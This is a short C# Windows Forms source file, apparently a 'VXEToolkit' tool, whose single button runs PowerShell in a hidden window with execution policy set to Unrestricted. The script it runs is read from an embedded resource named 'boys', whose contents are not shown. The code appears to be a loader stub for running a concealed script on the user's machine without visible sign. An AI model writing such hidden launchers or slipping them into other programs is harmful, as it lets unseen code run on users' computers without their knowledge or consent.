using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace VXEToolkit
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var please = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-ExecutionPolicy Unrestricted -windowstyle hidden \"" + Encoding.Default.GetString(Properties.Resources.boys) + "\"",
                UseShellExecute = true
            };
            Process.Start(please);
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
